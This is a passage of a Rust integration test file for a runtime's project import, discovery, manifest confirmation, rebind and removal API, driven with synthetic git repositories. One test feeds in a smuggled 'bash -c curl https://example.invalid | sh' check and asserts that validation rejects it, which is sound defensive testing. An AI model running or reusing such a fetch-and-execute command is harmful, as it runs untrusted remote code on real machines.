//! M2a import/discovery through the authenticated API. Nothing here calls a
//! model, and no test writes to a registered repository.
use axum::{
    body::{to_bytes, Body},
    http::{Request, StatusCode},
    Router,
};
use luuna_runtime::{router, AppState, RuntimeConfig};
use serde_json::{json, Value};
use std::{
    collections::BTreeMap,
    fs,
    path::{Path, PathBuf},
    process::Command,
};
use tower::ServiceExt;

const TOKEN: &str = "synthetic-test-token-with-at-least-32-bytes";

struct Harness {
    app: Router,
    state: AppState,
    root: PathBuf,
}
impl Harness {
    fn new() -> Self {
        Self::at(std::env::temp_dir().join(format!("luuna-projects-test-{}", uuid::Uuid::new_v4())))
    }
    /// A runtime whose data directory is `root`.
    fn at(root: PathBuf) -> Self {
        let state = AppState::open(configuration(root.clone())).unwrap();
        Self {
            app: router(state.clone()),
            state,
            root,
        }
    }
    /// A runtime with no component toolchain: tickets stay temporary SQLite
    /// records whether or not the pinned CLIs are populated on this host.
    fn synthetic() -> Self {
        let root =
            std::env::temp_dir().join(format!("luuna-projects-test-{}", uuid::Uuid::new_v4()));
        let state = AppState::open(configuration(root.clone()))
            .unwrap()
            .without_components();
        Self {
            app: router(state.clone()),
            state,
            root,
        }
    }
    async fn request(
        &self,
        method: &str,
        path: &str,
        body: Option<Value>,
        auth: bool,
    ) -> (StatusCode, Value) {
        let mut request = Request::builder().method(method).uri(path);
        if auth {
            request = request.header("Authorization", format!("Bearer {TOKEN}"));
        }
        if body.is_some() {
            request = request.header("Content-Type", "application/json");
        }
        let response = self
            .app
            .clone()
            .oneshot(
                request
                    .body(Body::from(body.map(|b| b.to_string()).unwrap_or_default()))
                    .unwrap(),
            )
            .await
            .unwrap();
        let status = response.status();
        let bytes = to_bytes(response.into_body(), 8 * 1024 * 1024)
            .await
            .unwrap();
        (
            status,
            serde_json::from_slice(&bytes).unwrap_or(Value::Null),
        )
    }
}
fn configuration(root: PathBuf) -> RuntimeConfig {
    RuntimeConfig {
        data_dir: root,
        pi_program: if cfg!(windows) { "python" } else { "python3" }.into(),
        pi_launcher_args: vec![],
        git_program: "git".into(),
        provider: None,
        model: None,
        token: TOKEN.into(),
        max_run_seconds: 10,
    }
}
impl Drop for Harness {
    fn drop(&mut self) {
        self.state.cancel_active();
        let _ = fs::remove_dir_all(&self.root);
    }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let output = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(args)
        .env("GIT_AUTHOR_NAME", "Fixture")
        .env("GIT_AUTHOR_EMAIL", "fixture@example.invalid")
        .env("GIT_COMMITTER_NAME", "Fixture")
        .env("GIT_COMMITTER_EMAIL", "fixture@example.invalid")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn synthetic_repository(dir: &Path) {
    git(dir, &["init", "-q", "-b", "main"]);
    git(dir, &["config", "commit.gpgsign", "false"]);
    fs::write(
        dir.join("Cargo.toml"),
        "[package]\nname = \"fixture\"\nversion = \"0.1.0\"\n",
    )
    .unwrap();
    fs::write(dir.join("Cargo.lock"), "# synthetic\n").unwrap();
    fs::write(dir.join("README.md"), "fixture\n").unwrap();
    git(dir, &["add", "."]);
    git(dir, &["commit", "-q", "-m", "initial"]);
    git(
        dir,
        &[
            "remote",
            "add",
            "origin",
            "https://user:secret-value@example.invalid/fixture.git",
        ],
    );
    fs::write(dir.join("README.md"), "developer work in progress\n").unwrap();
    fs::write(dir.join("staged.txt"), "staged\n").unwrap();
    git(dir, &["add", "staged.txt"]);
    fs::write(dir.join("untracked.txt"), "untracked\n").unwrap();
}

fn snapshot(dir: &Path) -> BTreeMap<String, Vec<u8>> {
    fn walk(root: &Path, dir: &Path, out: &mut BTreeMap<String, Vec<u8>>) {
        for entry in fs::read_dir(dir).unwrap() {
            let path = entry.unwrap().path();
            if path.is_dir() {
                walk(root, &path, out);
            } else {
                out.insert(
                    path.strip_prefix(root)
                        .unwrap()
                        .to_string_lossy()
                        .into_owned(),
                    fs::read(&path).unwrap(),
                );
            }
        }
    }
    let mut out = BTreeMap::new();
    walk(dir, dir, &mut out);
    out
}

fn register_body(id: &str, path: &Path) -> Value {
    json!({"id":id,"name":"Fixture project","repositories":[{"id":"app","path":path.to_string_lossy()}]})
}

#[tokio::test]
async fn synthetic_import_discovery_and_confirmation_preserve_the_checkout_and_replay() {
    let harness = Harness::new();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    let before = snapshot(repo.path());

    let (status, view) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{view}");
    assert_eq!(view["project"]["revision"], 0);
    let registration = &view["repositories"][0];
    assert_eq!(registration["repository_id"], "app");
    assert_eq!(
        registration["observation"]["identity"]["remote"],
        "https://example.invalid/fixture.git"
    );
    assert_eq!(registration["observation"]["branch"], "main");
    assert_eq!(registration["observation"]["dirty"]["staged"], 1);
    assert_eq!(registration["observation"]["dirty"]["unstaged"], 1);
    assert_eq!(registration["observation"]["dirty"]["untracked"], 1);
    assert!(!view.to_string().contains("secret-value"));

    let (status, discovery) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    assert_eq!(status, StatusCode::CREATED, "{discovery}");
    assert_eq!(discovery["repositories"][0]["profiles"], json!(["rust"]));
    let checks = discovery["repositories"][0]["proposed_checks"]
        .as_array()
        .unwrap();
    assert_eq!(checks[0]["check"]["id"], "cargo-test");
    assert_eq!(checks[0]["check"]["args"], json!(["test", "--locked"]));
    assert_eq!(checks[0]["confidence"], "observed");
    assert!(discovery["questions"]
        .as_array()
        .unwrap()
        .iter()
        .any(|q| q["topic"] == "dirty-checkout"));
    assert_eq!(discovery["manifest_problems"], json!([]));
    assert_eq!(discovery["proposed_manifest"]["revision"], 1);
    assert_eq!(
        snapshot(repo.path()),
        before,
        "discovery must not change the checkout"
    );

    // Confirmation binds the exact proposed manifest and the observed base commit.
    let manifest = discovery["proposed_manifest"].clone();
    let (status, confirmed) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":manifest})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{confirmed}");
    assert_eq!(confirmed["project"]["revision"], 1);
    let hash = confirmed["project"]["manifest_hash"]
        .as_str()
        .unwrap()
        .to_owned();
    assert!(hash.starts_with("sha256:"));
    let head = git(repo.path(), &["rev-parse", "HEAD"]);
    assert_eq!(confirmed["manifest"]["base_commits"]["app"], head.trim());
    assert_eq!(confirmed["manifest"]["manifest"], manifest);
    assert_eq!(
        snapshot(repo.path()),
        before,
        "confirmation must not change the checkout"
    );

    // Stale revision guard and a repeated confirmation of the same revision fail closed.
    let (status, _) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":manifest})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT);
    let mut revised = manifest.clone();
    revised["revision"] = json!(2);
    revised["repositories"][0]["remote"] = json!("https://example.invalid/other.git");
    let (status, body) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":1,"manifest":revised})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    revised["repositories"][0]["remote"] = json!("https://example.invalid/fixture.git");
    revised["repositories"][0]["default_branch"] = json!("release");
    let (status, _) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":1,"manifest":revised})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY);

    // Replay reconstructs the confirmed map; the durable stream survives reopening.
    let (status, events) = harness
        .request("GET", "/api/v1/projects/fixture/events", None, true)
        .await;
    assert_eq!(status, StatusCode::OK);
    let events = events.as_array().unwrap();
    let types: Vec<&str> = events.iter().map(|e| e["type"].as_str().unwrap()).collect();
    assert_eq!(
        types,
        vec![
            "project.registered",
            "repository.registered",
            "discovery.proposed",
            "manifest.confirmed"
        ]
    );
    let confirmed_event = events.last().unwrap();
    assert_eq!(confirmed_event["payload"]["manifest"], manifest);
    assert_eq!(confirmed_event["payload"]["manifest_hash"], hash);
    assert_eq!(
        confirmed_event["payload"]["base_commits"]["app"],
        head.trim()
    );
    assert!(events.iter().all(|e| e["run_id"] == "project:fixture"));
    let store = luuna_storage::Store::open(harness.root.join("luuna.sqlite3")).unwrap();
    let replayed = store.project_events_after("fixture", 3).unwrap();
    assert_eq!(replayed.len(), 1);
    assert_eq!(replayed[0].payload["manifest_hash"], hash);
    assert_eq!(
        store
            .get_project("fixture")
            .unwrap()
            .unwrap()
            .manifest_hash
            .as_deref(),
        Some(hash.as_str())
    );
    let (_, listed) = harness.request("GET", "/api/v1/projects", None, true).await;
    assert_eq!(listed[0]["id"], "fixture");
    assert_eq!(snapshot(repo.path()), before);
}

#[tokio::test]
async fn invalid_mismatched_and_unauthenticated_imports_are_rejected() {
    let harness = Harness::new();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    assert_eq!(
        harness
            .request(
                "POST",
                "/api/v1/projects",
                Some(register_body("fixture", repo.path())),
                false
            )
            .await
            .0,
        StatusCode::UNAUTHORIZED
    );
    let plain = tempfile::tempdir().unwrap();
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("plain", plain.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    assert!(body["error"]
        .as_str()
        .unwrap()
        .contains("not a Git repository"));
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(json!({"name":"x","repositories":[{"id":"app","path":"relative/path"}]})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let nested = repo.path().join("src");
    fs::create_dir(&nested).unwrap();
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("nested", &nested)),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    fs::remove_dir(&nested).unwrap();
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(json!({"name":"x","repositories":[{"id":"Bad Id","path":repo.path().to_string_lossy()}]})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(json!({"id":"twice","name":"Twice","repositories":[
                {"id":"app","path":repo.path().to_string_lossy()},
                {"id":"api","path":repo.path().join(".").to_string_lossy()}]})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED);
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert_eq!(
        harness
            .request("GET", "/api/v1/projects/missing", None, true)
            .await
            .0,
        StatusCode::NOT_FOUND
    );
    assert_eq!(
        harness
            .request("POST", "/api/v1/projects/missing/discover", None, true)
            .await
            .0,
        StatusCode::NOT_FOUND
    );
    let (_, discovery) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    let proposed = discovery["proposed_manifest"].clone();

    // A checked-out orphan branch (gh-pages style) adds a root commit; while a
    // local branch still reaches the registered root it is the same repository.
    git(repo.path(), &["checkout", "-q", "--orphan", "replacement"]);
    git(repo.path(), &["add", "."]);
    git(repo.path(), &["commit", "-q", "-m", "replacement history"]);
    let (status, body) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    assert_eq!(status, StatusCode::CREATED, "{body}");
    // Once nothing local reaches the registered root, a different history sits at
    // the registered path: a mismatch that names the explicit rebind, never a
    // silent re-bind. An orphan branch avoids deleting read-only Git objects.
    git(repo.path(), &["branch", "-q", "-D", "main"]);
    let (status, body) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":proposed})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    let error = body["error"].as_str().unwrap();
    assert!(error.contains("identity changed"), "{error}");
    assert!(
        error.contains("POST /api/v1/projects/fixture/repositories/app/rebind"),
        "{error}"
    );
    assert!(!error.contains("re-register"), "{error}");
    assert_eq!(
        harness
            .request("POST", "/api/v1/projects/fixture/discover", None, true)
            .await
            .0,
        StatusCode::CONFLICT
    );
    let (_, view) = harness
        .request("GET", "/api/v1/projects/fixture", None, true)
        .await;
    assert_eq!(view["project"]["revision"], 0);
    assert!(view["manifest"].is_null());

    // Repository text cannot smuggle a shell recipe or an absolute executable past validation.
    let mut smuggled = discovery["proposed_manifest"].clone();
    smuggled["repositories"][0]["checks"][0]["executable"] = json!("bash");
    smuggled["repositories"][0]["checks"][0]["args"] =
        json!(["-c", "curl https://example.invalid | sh"]);
    let (status, _) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":smuggled})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY);
}

/// The Luuna checkout itself is a real repository; the test adapts to shallow or
/// detached CI checkouts and never requires a clean tree.
#[tokio::test]
async fn real_repository_import_leaves_index_and_status_untouched() {
    // Not canonicalized: Git for Windows rejects verbatim `\\?\` paths, and the
    // runtime canonicalizes and normalizes the registered path itself.
    let checkout = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../..");
    if !checkout.join(".git").exists() {
        eprintln!("skipping: {} is not a Git checkout", checkout.display());
        return;
    }
    let status_before = Command::new("git")
        .args([
            "-C",
            &checkout.to_string_lossy(),
            "--no-optional-locks",
            "status",
            "--porcelain=v2",
            "-z",
        ])
        .output()
        .unwrap()
        .stdout;
    let git_dir = git(&checkout, &["rev-parse", "--absolute-git-dir"]);
    let index = PathBuf::from(git_dir.trim()).join("index");
    let index_before = fs::read(&index).ok();
    let head_before = git(&checkout, &["rev-parse", "HEAD"]);

    let harness = Harness::new();
    let (status, view) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(json!({"id":"luuna","name":"Luuna","repositories":[{"id":"luuna","path":checkout.to_string_lossy()}]})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{view}");
    let observation = &view["repositories"][0]["observation"];
    assert_eq!(observation["head_commit"], head_before.trim());
    assert!(observation["git_version"]
        .as_str()
        .unwrap()
        .starts_with("git version"));
    let (status, discovery) = harness
        .request("POST", "/api/v1/projects/luuna/discover", None, true)
        .await;
    assert_eq!(status, StatusCode::CREATED, "{discovery}");
    let repo = &discovery["repositories"][0];
    let profiles = repo["profiles"].as_array().unwrap();
    assert!(profiles.contains(&json!("rust")), "{profiles:?}");
    assert!(profiles.contains(&json!("node")), "{profiles:?}");
    let ids: Vec<&str> = repo["proposed_checks"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| c["check"]["id"].as_str().unwrap())
        .collect();
    assert!(
        ids.contains(&"cargo-test") && ids.contains(&"npm-test"),
        "{ids:?}"
    );
    let proposed = &discovery["proposed_manifest"];
    let default_branch = proposed["repositories"][0]["default_branch"]
        .as_str()
        .unwrap();
    let branch_observed = observation["branch"] == default_branch
        || observation["remote_default_branch"] == default_branch
        || observation["local_branches"]
            .as_array()
            .unwrap()
            .contains(&json!(default_branch));
    if discovery["manifest_problems"]
        .as_array()
        .unwrap()
        .is_empty()
        && branch_observed
    {
        let (status, confirmed) = harness
            .request(
                "PUT",
                "/api/v1/projects/luuna/manifest",
                Some(json!({"expected_revision":0,"manifest":proposed})),
                true,
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{confirmed}");
        assert_eq!(
            confirmed["manifest"]["base_commits"]["luuna"],
            head_before.trim()
        );
    } else {
        eprintln!(
            "real checkout proposal needs developer input before confirmation: {} / {}",
            discovery["manifest_problems"], discovery["questions"]
        );
        assert!(
            discovery["questions"]
                .as_array()
                .unwrap()
                .iter()
                .any(|q| q["topic"] == "default-branch")
                || !discovery["manifest_problems"]
                    .as_array()
                    .unwrap()
                    .is_empty()
        );
    }

    let status_after = Command::new("git")
        .args([
            "-C",
            &checkout.to_string_lossy(),
            "--no-optional-locks",
            "status",
            "--porcelain=v2",
            "-z",
        ])
        .output()
        .unwrap()
        .stdout;
    assert_eq!(
        status_after, status_before,
        "import must not alter the real checkout"
    );
    assert_eq!(
        fs::read(&index).ok(),
        index_before,
        "import must not rewrite the Git index"
    );
    assert_eq!(git(&checkout, &["rev-parse", "HEAD"]), head_before);
}

fn events(value: &Value) -> Vec<Value> {
    value.as_array().cloned().unwrap_or_default()
}

#[tokio::test]
async fn an_explicit_rebind_recovers_a_changed_remote_or_a_moved_checkout() {
    let harness = Harness::new();
    let parent = tempfile::tempdir().unwrap();
    let repo = parent.path().join("checkout");
    fs::create_dir(&repo).unwrap();
    synthetic_repository(&repo);
    git(&repo, &["commit", "-q", "-am", "commit developer work"]);
    let (status, view) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", &repo)),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{view}");

    // History that gains a root (a subtree-style merge of unrelated history) and
    // an equivalent spelling of the same remote are still the registered repository.
    git(&repo, &["checkout", "-q", "--orphan", "vendor"]);
    git(&repo, &["rm", "-q", "-r", "--cached", "."]);
    fs::write(repo.join("vendored.txt"), "vendored\n").unwrap();
    git(&repo, &["add", "vendored.txt"]);
    git(&repo, &["commit", "-q", "-m", "vendor"]);
    git(&repo, &["checkout", "-q", "-f", "main"]);
    git(
        &repo,
        &[
            "merge",
            "-q",
            "--allow-unrelated-histories",
            "-m",
            "merge vendor",
            "vendor",
        ],
    );
    git(&repo, &["branch", "-q", "-D", "vendor"]);
    git(
        &repo,
        &[
            "remote",
            "set-url",
            "origin",
            "https://EXAMPLE.invalid/fixture/",
        ],
    );
    let (status, body) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    assert_eq!(status, StatusCode::CREATED, "{body}");

    // A different transport is a changed identity; the error names the recovery.
    git(
        &repo,
        &[
            "remote",
            "set-url",
            "origin",
            "git@example.invalid:fixture.git",
        ],
    );
    let (status, body) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains(
            "rebind the repository with POST /api/v1/projects/fixture/repositories/app/rebind"
        ),
        "{body}"
    );

    let rebind = "/api/v1/projects/fixture/repositories/app/rebind";
    assert_eq!(
        harness
            .request("POST", rebind, Some(json!({})), false)
            .await
            .0,
        StatusCode::UNAUTHORIZED
    );
    assert_eq!(
        harness
            .request(
                "POST",
                "/api/v1/projects/fixture/repositories/api/rebind",
                Some(json!({})),
                true
            )
            .await
            .0,
        StatusCode::NOT_FOUND
    );
    assert_eq!(
        harness
            .request(
                "POST",
                rebind,
                Some(json!({"local_path":"relative/checkout"})),
                true
            )
            .await
            .0,
        StatusCode::BAD_REQUEST
    );

    // While a run may be executing in the checkout, the binding is not changed.
    {
        let mut store = luuna_storage::Store::open(harness.root.join("luuna.sqlite3")).unwrap();
        store
            .create_run("busy-baseline", "fixture", json!({"kind":"baseline"}))
            .unwrap();
    }
    let (status, body) = harness.request("POST", rebind, Some(json!({})), true).await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("busy-baseline"),
        "{body}"
    );
    {
        let mut store = luuna_storage::Store::open(harness.root.join("luuna.sqlite3")).unwrap();
        store
            .transition_run(
                "busy-baseline",
                1,
                luuna_domain::RunState::Cancelled,
                "run.cancelled",
                json!({}),
            )
            .unwrap();
    }

    let (status, view) = harness.request("POST", rebind, Some(json!({})), true).await;
    assert_eq!(status, StatusCode::OK, "{view}");
    assert_eq!(
        view["repositories"][0]["observation"]["identity"]["remote"],
        "git@example.invalid:fixture.git"
    );
    let (_, stream) = harness
        .request("GET", "/api/v1/projects/fixture/events", None, true)
        .await;
    let stream = events(&stream);
    let rebound = stream.last().unwrap();
    assert_eq!(rebound["type"], "repository.rebound");
    assert_eq!(rebound["payload"]["repository_id"], "app");
    assert_eq!(
        rebound["payload"]["old"]["identity"]["remote"],
        "https://example.invalid/fixture.git"
    );
    assert_eq!(
        rebound["payload"]["new"]["identity"]["remote"],
        "git@example.invalid:fixture.git"
    );
    assert!(rebound["payload"]["manifest_remote_matches"].is_null());
    let (status, discovery) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    assert_eq!(status, StatusCode::CREATED, "{discovery}");
    assert_eq!(
        discovery["proposed_manifest"]["repositories"][0]["remote"],
        "git@example.invalid:fixture.git"
    );
    // Rebinding an unchanged checkout records nothing new.
    let count = stream.len();
    let (status, _) = harness.request("POST", rebind, Some(json!({})), true).await;
    assert_eq!(status, StatusCode::OK);
    let (_, after) = harness
        .request("GET", "/api/v1/projects/fixture/events", None, true)
        .await;
    assert_eq!(events(&after).len(), count + 1, "only discovery was added");

    // A moved checkout cannot be inspected until it is rebound to its new path.
    let moved = parent.path().join("moved");
    fs::rename(&repo, &moved).unwrap();
    let (status, body) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    assert!(body["error"].as_str().unwrap().contains(rebind), "{body}");
    let (status, view) = harness
        .request(
            "POST",
            rebind,
            Some(json!({"local_path": moved.to_string_lossy()})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{view}");
    let canonical = fs::canonicalize(&moved).unwrap();
    assert_eq!(
        fs::canonicalize(view["repositories"][0]["local_path"].as_str().unwrap()).unwrap(),
        canonical
    );
    let (_, stream) = harness
        .request("GET", "/api/v1/projects/fixture/events", None, true)
        .await;
    let rebound = events(&stream).last().cloned().unwrap();
    assert_eq!(rebound["type"], "repository.rebound");
    assert!(rebound["payload"]["old"]["local_path"]
        .as_str()
        .unwrap()
        .ends_with("checkout"));
    assert_eq!(
        harness
            .request("POST", "/api/v1/projects/fixture/discover", None, true)
            .await
            .0,
        StatusCode::CREATED
    );

    // Another project's checkout cannot be taken over by a rebind.
    let other = tempfile::tempdir().unwrap();
    synthetic_repository(other.path());
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("other", other.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED);
    let (status, body) = harness
        .request(
            "POST",
            rebind,
            Some(json!({"local_path": other.path().to_string_lossy()})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(
        body["error"]
            .as_str()
            .unwrap()
            .contains("already registered as repository app of project other"),
        "{body}"
    );
}

#[tokio::test]
async fn a_checkout_is_registered_once_and_never_overlaps_the_data_directory() {
    let harness = Harness::new();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED);
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("copy", &repo.path().join("."))),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(
        body["error"]
            .as_str()
            .unwrap()
            .contains("already registered as repository app of project fixture"),
        "{body}"
    );
    assert_eq!(
        harness
            .request("GET", "/api/v1/projects/copy", None, true)
            .await
            .0,
        StatusCode::NOT_FOUND
    );

    // A repository inside the data directory, such as a Luuna-owned worktree.
    let inside = harness.root.join("worktrees").join("app");
    fs::create_dir_all(&inside).unwrap();
    synthetic_repository(&inside);
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("owned", &inside)),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("LUUNA_DATA_DIR"),
        "{body}"
    );

    // A data directory inside the repository: the runtime was started there.
    let enclosing = tempfile::tempdir().unwrap();
    synthetic_repository(enclosing.path());
    let nested = Harness::at(enclosing.path().join(".luuna"));
    let (status, body) = nested
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("enclosing", enclosing.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    let error = body["error"].as_str().unwrap();
    assert!(
        error.contains("LUUNA_DATA_DIR") && error.contains("inside this checkout"),
        "{error}"
    );
}

/// ADR 0063: removing hides a project and frees its checkout; its records stay,
/// and registering the same folder again brings it back.
#[tokio::test]
async fn removing_a_project_hides_it_frees_its_checkout_and_the_same_folder_brings_it_back() {
    let harness = Harness::new();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED);
    assert_eq!(
        harness
            .request("DELETE", "/api/v1/projects/fixture", None, false)
            .await
            .0,
        StatusCode::UNAUTHORIZED
    );
    let (status, body) = harness
        .request("DELETE", "/api/v1/projects/fixture", None, true)
        .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body, json!({"removed":"fixture"}));
    assert_eq!(
        harness
            .request("GET", "/api/v1/projects/fixture", None, true)
            .await
            .0,
        StatusCode::NOT_FOUND
    );
    let (_, list) = harness.request("GET", "/api/v1/projects", None, true).await;
    assert_eq!(list, json!([]));
    assert_eq!(
        harness
            .request("DELETE", "/api/v1/projects/fixture", None, true)
            .await
            .0,
        StatusCode::NOT_FOUND
    );
    // Its ID stays its own: another folder under that ID is refused.
    let other = tempfile::tempdir().unwrap();
    synthetic_repository(other.path());
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", other.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("was removed"),
        "{body}"
    );
    // Scaffolding refuses the reserved name before it creates anything.
    let parent = tempfile::tempdir().unwrap();
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects/scaffold/propose",
            Some(json!({"profile":"node","name":"fixture","parent_dir":parent.path().to_string_lossy()})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("was removed"),
        "{body}"
    );
    assert!(!parent.path().join("fixture").exists());
    // The same folder under its ID brings it back, with its event record.
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["project"]["id"], "fixture");
    let (_, replay) = harness
        .request("GET", "/api/v1/projects/fixture/events", None, true)
        .await;
    let types: Vec<_> = events(&replay)
        .iter()
        .map(|e| e["type"].as_str().unwrap_or_default().to_owned())
        .collect();
    assert!(
        types.contains(&"project.registered".to_owned()),
        "{types:?}"
    );
    assert!(types.contains(&"project.removed".to_owned()), "{types:?}");
    assert!(types.contains(&"project.restored".to_owned()), "{types:?}");
    // Without an ID, the same folder brings back the project that held it.
    assert_eq!(
        harness
            .request("DELETE", "/api/v1/projects/fixture", None, true)
            .await
            .0,
        StatusCode::OK
    );
    let unnamed = json!({"name":"Renamed","repositories":[{"id":"app","path":repo.path().to_string_lossy()}]});
    let (status, body) = harness
        .request("POST", "/api/v1/projects", Some(unnamed), true)
        .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["project"]["id"], "fixture");
    // A removed project's folder is free for a new project.
    assert_eq!(
        harness
            .request("DELETE", "/api/v1/projects/fixture", None, true)
            .await
            .0,
        StatusCode::OK
    );
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fresh", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{body}");
    // ...and while it holds the folder the removed one stays removed.
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("of project fresh"),
        "{body}"
    );
}

#[tokio::test]
async fn project_event_pages_are_bounded_and_huge_cursors_are_client_errors() {
    let harness = Harness::new();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    let page = |query: &'static str| {
        let harness = &harness;
        async move {
            harness
                .request(
                    "GET",
                    &format!("/api/v1/projects/fixture/events{query}"),
                    None,
                    true,
                )
                .await
        }
    };
    let (status, body) = page("?after=18446744073709551615").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("cursor"), "{body}");
    let (status, body) = page("?after=9223372036854775807").await;
    assert_eq!((status, body), (StatusCode::OK, json!([])));
    let (status, body) = page("?limit=1").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(events(&body).len(), 1);
    assert_eq!(body[0]["type"], "project.registered");
    let (status, body) = page("?after=1&limit=1").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body[0]["type"], "repository.registered");
    assert_eq!(body[0]["sequence"], 2);
    for invalid in ["?limit=0", "?limit=10001"] {
